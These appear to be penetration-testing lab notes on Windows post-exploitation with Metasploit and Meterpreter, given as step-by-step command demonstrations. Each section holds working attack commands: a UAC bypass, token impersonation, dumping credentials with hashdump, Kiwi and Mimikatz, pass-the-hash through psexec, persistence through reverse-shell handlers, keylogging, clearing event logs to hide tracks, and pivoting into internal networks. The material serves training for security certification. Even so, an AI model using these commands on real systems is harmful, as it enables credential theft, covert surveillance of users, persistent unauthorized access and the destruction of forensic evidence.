# a - Windows Post Exploitation

## <mark style="color:red;">**Windows Post Exploitation Modules**</mark>

* The MSF provides us with various post exploitation modules for both Windows and Linux.
* We can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to:
  * Enumerate user privileges
  * Enumerate logged on users
  * VM check
  * Enumerate installed programs
  * Enumerate AVs
  * Enumerate computers connected to domain
  * Enumerate installed patches
  * Enumerate shares

## **Practical Demonstration**

<pre class="language-bash"><code class="lang-bash"># meterpreter on windows.
meterpreter > sysinfo
meterpreter > help # help menu.
meterpreter > getsystem # Attempt to elevate privileges on the target system through Token Impersonation..
meterpreter > hashdump # Dump the hashes from the SAM database
meterpreter > show_mount # Show all the drives on the target system (fixed or removable drives).
meterpreter > ps # list all the processes.
meterpreter > migrate &#x3C;PID> # Migrate to another process

# post exploitation modules.
msf5 > use post/windows/archmigrate #Migrate to another architecture
msf5 > use post/windows/manage/migrate # Create a new process and migrate to it.
msf5 > use post/windows/gather/win_privs #Return privileges of the current user
msf5 > use post/windows/gather/enum_logged_on_users # Enumerate logged on and previously logged on users
msf5 > use post/windows/gather/checkvm #Check if the system is running inside a VM.
msf5 > use post/windows/gather/enum_applications # Enumerate installed application on the windows target system
msf5 > use post/windows/gather/<a data-footnote-ref href="#user-content-fn-1">enum_av_excluded</a> # Enumerate folders excluded by WIndows AV scans, this can be useful as we can store our payloads there.
msf5 > use post/windows/gather/enum_computers # Enumerate computers part of the target system primary domain
msf5 > use post/windows/gather/enum_patches # Enumerate windows applied patches.
msf5 > use post/windows/gather/enum_shares # Enumerate windows SMB share.
msf5 > use post/windows/manage/enable_rdp # Allow to enable RDP.
</code></pre>



## <mark style="color:red;">Windows Privilege Escalation: Bypassing UAC</mark>

* User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
* UAC is used to ensure that changes to the operating system require approval from the administrator.
* We can utilize the “Windows Escalate UAC Protection Bypass (In Memory injection)” module to bypass UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.

**Practical Demonstration**

```bash
# we will be using the "rejetto" vuln to exploit the target.
search rejetto
set payload windows/x64/meterpreter/reverse_tcp
getsystem # to automatically elevate privilege in windows sustem.
getprivs #current user privileges in Windows.
shell # spawn cmd prompt shell.

# You need a user part of the local administrator group to bypass UAC.
shell > net users # Enumerate every users on the system
shell > net localgroup administrators #Enumerate every users part of the administrator group on the system.
# the "admin" user is part of the LocalAdministrators group.

msf6 > use exploit/windows/http/bypassuac_injection # Bypass UAC with memory injection.
msf6 > use payload windows/x64/meterpreter/reverse_tcp
msf6 > set SESSIONS 1 and LPORT
msf6 > set TARGET Windows\ x64
run
#You can then use the getsystem command to elevate your privileges
msf6 > getsystem
```



## <mark style="color:red;">Windows Privilege Escalation: Token Impersonation With Incognito</mark>

**Windows Access Tokens**

* Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).
* A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.
* Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
* Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
* An access token will typically be assigned one of the following security levels:
  * **Impersonate-level** tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
  * **Delegate-level** tokens are typically created through an interactive login on Windows; primarily through a traditional login or through remote access protocols such as RDP.
* Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
* Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

### **Windows Privileges**

▪ The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.

* The following are the privileges that are required for a successful impersonation attack:
  * **SeAssignPrimaryToken:** This allows a user to impersonate tokens.
  * **SeCreateToken:** This allows a user to create an arbitrary token with administrative privileges.
  * **SeImpersonatePrivilege:** This allows a user to create a process under the security context of another user typically with administrative privileges.

**The Incognito Module**

* Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
* We can use the incognito module to display a list of available tokens that we can impersonate.

**Practical Demonstration**

```bash
meterpreter > sysinfo # system information.
meterpreter > getuid # username.
meterpreter > getprivs # display privileges of user.

meterpreter > load incognito # Load the incognito module
meterpreter > list_tokens -u # List tokens by usernames
# in this case we want to impersonat the Access token for the Administrator user.
meterpreter > impersonate_token "<tokenName>" #Impersonate a token in order to elevate privileges
meterpreter > impersonate_token "ATTACKDEFENSE\Adminsitrator"
meterpreter > ps
meterpreter > migrate <pid> # lets migrate to the file explorer.exe process.
meterpreter > hashdump # now we can dump users hashes.
```



## <mark style="color:red;">Dumping Hashes With Mimikatz</mark>

**Mimikatz**

* Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM databases, and more.
* The SAM (Security Account Manager) database file on Windows systems that stores users passwords and can be used to authenticate users both locally and remotely.
* We can utilize the pre-built mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
* Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk.

**Practical Demonstration**

```bash
# for initial access to the victim, we exploited the Badblue vuln.

meterpreter > sysinfo
meterpreter > getuid 
meterpreter > pgrep lsass # search fro the lsass process, we migrate to the process.
meterpreter > sysifo

# method 1
meterpreter > load kiwi # Load the Kiwi extension.
meterpreter > help # we can see the kiwi help menu.
meterpreter > creds_all # Retrieve all possible creds.
meterpreter > lsa_dump_sam #Dump all NTLM hashes
meterpreter > lsa_dump_secrets # Dump secrets like the Syskey which is the flag in this case.

# method 2
# transfering the mimikatz binaries from kali to the victim system.
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe #Upload the mimikatz binary onto the target system
shell
C:\> .\mimikatz.exe
C:\> pricilege::debug # when we get the '20' OK, we are good to go.
C:\> sekurlsa::logonpasswords # dumps logon passwords.
C:\> lsadump::sam #Dump the SAM database
```



## <mark style="color:red;">Pass-The-Hash With PSExec</mark>

**Pass-The-Hash**

* Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
* We can use the PsExec module to legitimately authenticate with the target system via SMB.
* This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

### **Practical Demonstration**

```bash
# for initial access, we used the Badblue exploit enterprise edition.

meterpreter > sysinfo
meterpreter > getuid
meterpreter > pgrep lsass
meterpreter > migrate <lsas PID>
meterpreter > getuid # we have NT AUTHORITY.

# Use the command hashdump and save all of the hashes in a file
meterpreter > hashdump # copy and save to a file.

# we can use the hash for the Administrator user, to authenticate using the 
#'psexec' module.
meterpreter > use exploit/windows/smb/psexec #Use the hash as SMBPass and it's correspondant username as SMBUser
meterpreter > set payload windows/x64/meterpreter/reverse_tcp # because victim is using a 64bit system.
meterpreter > set SMBUser Administrator
meterpreter > set SMBPass <hash> # without the colons (::).
meterpreter > exploit # we get another meterpreter session.
meterpreter > getuid # NT AUTHORITY.
```



## <mark style="color:red;">Establishing Persistence On Windows</mark>

**Establishing Persistence On Windows**

* Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.
* Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.
* We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

### **Practical Demonstration**

```bash
# we use the rejetto to gain initiaal access.
meterpreter > sysinfo
meterpreter > getuid # Administrator user.
meterpreter > ctrl+z # background the session.


# Persistence require elevated privileges
msf6 > search platform:windows persistence
msf6 > use exploit/windows/local/persistence_service # Allow to establish a reliable persistence on the target system.
msf6 > set payload windows/meterpreter/reverse_tcp # it uses the 32bit (x86).
msf6 > set SESSION 1
exploit

sessions -K # kill all sessions.
# To get the session back, use multi/handler and set the same PAYLOAD, LHOST and, LPORT options as you did when configuring the persistence
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $kaliIP
run
```



## <mark style="color:red;">Enabling RDP</mark>

* The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.
* RDP uses TCP port 3389 by default.
* RDP is disabled by default, however, we can utilize an MSF exploit module to enable RDP on Windows target and consequently utilize RDP to remotely access to the target system.
* RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.

### **Practical Demonstration**

```bash
# for initial access we use the Badblue vuln.

msf5 > search enable_rdp
msf5 > use post.windows/manage/enable_rdp #Enable RDP on the target machine
set sessions 1
exploit
db_nmap -p3389 $ip # to confirm rdp is open.

# we can change the password of the Amdinistrator, but this is not recommended, as it can serve as indicator of compromise.
sessions 1 # to load the session.
shell # spawn cmd prompt.
C:\> net user Administrator hacker123 # to change password, you need admin privs.

# connect to a target PC with a rdp utility
xfreerdp /u:<username> /p:<password> /v:<targetIP> #Connect to the target system via RDP using legitimate credentials.
# get the flag in the Admin Desktop folder.
```



## <mark style="color:red;">Windows Keylogging</mark>

* Keylogging is the process of recording or capturing the keystrokes entered on a target system.
* This technique is not limited to post exploitation, there are plenty of programs and USB devices that can be used to capture and transmit the keystrokes entered on a system.
* Meterpreter on a Windows system provides us with the ability to capture the keystrokes entered on a target system and download them back to our local system.

### **Practical Demonstration**

```bash
# we use Badblue for exploitation.

# Best to migrate meterpreter to explorer.exe before setting up keylogging.
meterpreter > pgrep explorer.exe
meterpreter > migrate <explorer PID>

meterpreter > help # check the User interface cmd help menu.
meterpreter > keyscan_start # Start the keylogging
meterpreter > keyscan_dump #Dump the results of the keylogging
meterpreter > keyscan_stop #Stop the keylogging

# practical test
# goto the victim pc, launch notepad
# goto the kali pc and run the keyscan_start module.
meterpreter > keyscan_start # Start the keylogging

# back in the victim, type somethings and the attacker can see it.
# in the kali, use the ketyscan_dump to dump everything.
meterpreter > keyscan_dump #Dump the results of the keylogging.

# you may need to restart the keyscan to get more dumps.
```



## <mark style="color:red;">Clearing Windows Event Logs</mark>

* The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event log.
* Event logs are categorized based on the type of events they store:
  * Application logs: Stores application/program events like startups, crashes etc.
  * System logs: Stores system like startups, crashes etc.
  * Security logs: Stores security events like password changes, authentication failures etc.
* Event logs can be accessed via the Event Viewer on Windows.
* The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment.

**Practical Demonstration**

```bash
# we used the Badblue to gain initial access.

# practical log demonstration
# after initial access, on the kali, we can spawn shell and change the adminsitrarot password.
shell
C:\> net user Administrator password11 # change admin password.
# open the windows event viewer on the target, in the Security tab, we can see the event logged


# Needs elevated privileges.
meterpreter > clearev # Clear tracks and logs from the EventViewer.
# You also have to delete every file uploaded during the assessement.
```



## <mark style="color:red;">Pivoting</mark>

* Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host's private internal network.
* After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously.
* Meterpreter provides us with the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network.

### **Pivoting Visualized**

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>pivoting</p></figcaption></figure>

### **Practical Demonstration**

```bash
# for initial access we use the Rejetto vuln
# we don't need to upgrade our meterpreter session from 32bit to 64bit.

# pivoting
# step 1 - adding route to the 2nd target subnet/
meterpreter > ipconfig # lists out all the network interfaces.
meterpreter > run autoroute -s <subnet> # add a static route to the network of victim 2 (10.2.27.207/24 subnet will be 10.2.25.0/24 for example).
#The route is only accessible via MSF
# background the session.

# step 2 - scan for an open port on the added route
meterpreter > search portscan # we use this module to search for an open port.
use 5
set RHOSTS $ip_victim2
set RPORTS 1-100 # you can scan entire 65565 ports for an open port, but we limit it to 100 to save time here.
exploit # we found port "80" open on victim 2.
# now we cant interact with victim2.
#To be able to interact with the newly routed IP, we need to port forward it to our machine.

# using the "portfwd" module to do port forwarding from victim2 to our kali.
# portfwd add -l <localPort> -p <targetPort> -r <targetIP>
meterpreter > portfwd add -l 1234 -p 80 -r $ip_victim2
# where "-p" is the victim open port we want to forward, "-l" is where we want to forward to, on our kali.

# now we can do an nmap scan, and can interact with the victim2 through port 1234.
# we can also access the service on our browser, localhost:1234
db_nmap -sS -sV -p 1234 localhost # This command will scan port 80 on the newly routed target.
# after scan, we detected victim2 is running Badblue on the port80 (we forwarded to 1234).

search Badblue
use 1
# Using MSF, you have to use bind_tcp for routed targets.
set payload windows/meterpreter/bind_tcp
set RHOSTS $victim2_ip
set LPORT 4433
exploit # we get a meterpreter session for the victim2.
sessions -n victim-2 -i 2 # rename the session for victim 2
sysinfo
```





[^1]: Windows AntiVirus Folder scan exclusion list.
